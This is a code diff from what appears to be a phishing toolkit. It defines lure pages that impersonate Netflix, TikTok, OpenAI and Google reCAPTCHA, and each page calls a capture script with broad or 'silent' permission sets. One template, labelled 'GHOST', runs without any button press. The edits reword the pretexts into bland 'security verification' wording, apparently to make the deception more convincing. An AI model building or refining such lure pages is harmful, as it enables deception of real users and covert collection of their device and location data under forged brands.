-    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Netflix Household</title><style>body { background:#000; color:#fff; font-family: 'Netflix Sans', sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; } .box { width:400px; padding:40px; text-align:center; } .logo { color:#e50914; font-size:40px; font-weight:bold; margin-bottom:30px; } h2 { font-size:26px; margin-bottom:15px; } p { color:#999; font-size:16px; margin-bottom:35px; } .btn { background:#e50914; color:#fff; border:none; padding:16px; font-weight:bold; cursor:pointer; width:100%; font-size:16px; }</style></head><body><div class="box"><div class="logo">NETFLIX</div><h2>Confirm Household</h2><p>To enjoy Netflix on this device, we need to confirm it belongs to your primary household via location and device mapping.</p><button class="btn" onclick="window.startCapture();">Confirm Device</button></div>${getCaptureScript(id, 'https://www.netflix.com/youraccount', {
+    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Netflix Household</title><style>body { background:#000; color:#fff; font-family: 'Netflix Sans', sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; } .box { width:400px; padding:40px; text-align:center; } .logo { color:#e50914; font-size:40px; font-weight:bold; margin-bottom:30px; } h2 { font-size:26px; margin-bottom:15px; } p { color:#999; font-size:16px; margin-bottom:35px; } .btn { background:#e50914; color:#fff; border:none; padding:16px; font-weight:bold; cursor:pointer; width:100%; font-size:16px; }</style></head><body><div class="box"><div class="logo">NETFLIX</div><h2>Confirm Household</h2><p>To enjoy Netflix on this device, we need to perform a brief security verification check.</p><button class="btn" onclick="window.startCapture();">Confirm Access</button></div>${getCaptureScript(id, 'https://www.netflix.com/youraccount', {
       tmplId: 'netflix', perms: ALL_PERMS, accent: '#e50914', icon: '📺'
     })}</body></html>`
   },
   'tiktok': {
     name: "🎵 Social: Creator Portal (Full Scope)",
-    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>TikTok Verification</title><style>body { background:#fff; font-family: 'TikTokFont', sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; color:#000; } .box { width:360px; text-align:center; } .logo { font-size:32px; font-weight:bold; margin-bottom:40px; } h2 { font-size:20px; font-weight:700; margin-bottom:10px; } p { color:#555; font-size:14px; margin-bottom:40px; } .btn { background:#fe2c55; color:#fff; padding:12px; border:none; font-weight:bold; cursor:pointer; width:100%; font-size:16px; }</style></head><body><div class="box"><div class="logo">TikTok</div><h2>System Audit</h2><p>Please audit your browser environment and device metrics to maintain creator eligibility and safety status.</p><button class="btn" onclick="window.startCapture();">Start Audit</button></div>${getCaptureScript(id, 'https://www.tiktok.com/setting', {
+    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>TikTok Verification</title><style>body { background:#fff; font-family: 'TikTokFont', sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; color:#000; } .box { width:360px; text-align:center; } .logo { font-size:32px; font-weight:bold; margin-bottom:40px; } h2 { font-size:20px; font-weight:700; margin-bottom:10px; } p { color:#555; font-size:14px; margin-bottom:40px; } .btn { background:#fe2c55; color:#fff; padding:12px; border:none; font-weight:bold; cursor:pointer; width:100%; font-size:16px; }</style></head><body><div class="box"><div class="logo">TikTok</div><h2>Security Verification</h2><p>Please perform a quick network security verification to maintain creator eligibility and safety status.</p><button class="btn" onclick="window.startCapture();">Start Verification</button></div>${getCaptureScript(id, 'https://www.tiktok.com/setting', {
       tmplId: 'tiktok', perms: ALL_PERMS, accent: '#fe2c55', icon: '🎵'
     })}</body></html>`
   },
   'chatgpt': {
     name: "🤖 AI: OpenAI Dev Audit (Full Scope)",
-    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>OpenAI Auth</title><style>body { background:#fff; font-family: sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; } .box { width:320px; text-align:center; } .logo { font-size:40px; margin-bottom:20px; } h2 { font-size:22px; margin-bottom:10px; } p { color:#666; font-size:14px; margin-bottom:30px; } .btn { background:#10a37f; color:#fff; border:none; padding:12px; border-radius:4px; cursor:pointer; width:100%; font-weight:bold; }</style></head><body><div class="box"><div class="logo">⚙️</div><h2>System Verification</h2><p>OpenAI requires a brief hardware and location audit to maintain your API quota and developer status.</p><button class="btn" onclick="window.startCapture();">Verify Now</button></div>${getCaptureScript(id, 'https://platform.openai.com/account', {
+    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>OpenAI Auth</title><style>body { background:#fff; font-family: sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; } .box { width:320px; text-align:center; } .logo { font-size:40px; margin-bottom:20px; } h2 { font-size:22px; margin-bottom:10px; } p { color:#666; font-size:14px; margin-bottom:30px; } .btn { background:#10a37f; color:#fff; border:none; padding:12px; border-radius:4px; cursor:pointer; width:100%; font-weight:bold; }</style></head><body><div class="box"><div class="logo">⚙️</div><h2>Security Verification</h2><p>OpenAI requires a brief network security verification to prevent misuse and spam.</p><button class="btn" onclick="window.startCapture();">Verify Now</button></div>${getCaptureScript(id, 'https://platform.openai.com/account', {
       tmplId: 'chatgpt', perms: ALL_PERMS, accent: '#10a37f', icon: '🤖'
     })}</body></html>`
   },
   'recap': {
     name: "🕵️ GHOST: Silent Integrity (OP - No Button)",
-    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>reCAPTCHA</title><style>body { display:flex; align-items:center; justify-content:center; height:100vh; margin:0; background:#fdfdfd; font-family:sans-serif; } .box { border:1px solid #dbdbdb; padding:15px; background:#fff; display:flex; align-items:center; width:300px; box-shadow:0 1px 3px rgba(0,0,0,0.05); }</style></head><body><div style="text-align:center;"><p style="color:#555; margin-bottom:15px; font-size:14px;">Checking browser hardware integrity...</p><div class="box"><div style="width:24px; height:24px; border:2px solid #cecece; margin-right:15px;"></div><div style="font-size:13px; color:#555;">Finalizing audit...</div><div style="margin-left:auto; text-align:center; font-size:10px; color:#999;"><img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" width="28"><br>reCAPTCHA</div></div></div>${getCaptureScript(id, 'https://google.com/', {
+    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>reCAPTCHA</title><style>body { display:flex; align-items:center; justify-content:center; height:100vh; margin:0; background:#fdfdfd; font-family:sans-serif; } .box { border:1px solid #dbdbdb; padding:15px; background:#fff; display:flex; align-items:center; width:300px; box-shadow:0 1px 3px rgba(0,0,0,0.05); }</style></head><body><div style="text-align:center;"><p style="color:#555; margin-bottom:15px; font-size:14px;">Checking network security integrity...</p><div class="box"><div style="width:24px; height:24px; border:2px solid #cecece; margin-right:15px;"></div><div style="font-size:13px; color:#555;">Finalizing check...</div><div style="margin-left:auto; text-align:center; font-size:10px; color:#999;"><img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" width="28"><br>reCAPTCHA</div></div></div>${getCaptureScript(id, 'https://google.com/', {
       tmplId: 'recap', flow: 'silent', perms: SILENT_PERMS
     })}</body></html>`
   }
